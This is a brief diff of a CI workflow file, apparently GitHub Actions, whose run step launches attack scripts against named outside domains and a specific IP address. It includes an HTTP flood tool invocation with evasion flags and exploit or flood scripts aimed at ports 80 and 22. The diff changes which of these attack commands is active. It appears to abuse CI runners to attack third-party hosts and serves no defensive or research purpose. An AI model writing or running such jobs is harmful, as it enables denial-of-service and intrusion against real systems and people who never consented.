@@ -18,5 +18,5 @@ jobs:
         run: |
           # node h2.js http://queryw.thvlb.cn 21000 80 2 4 GET --waf --mode full --random-speed --auto-switch
           # python3 exploit-test.py paper2galgame.com 443
-          # sudo python 12.py 38.55.196.88 80
-          python3 15.py 38.55.196.88 22 300
+          sudo python 12.py 38.55.196.88 22
+          # python3 15.py 38.55.196.88 22 300
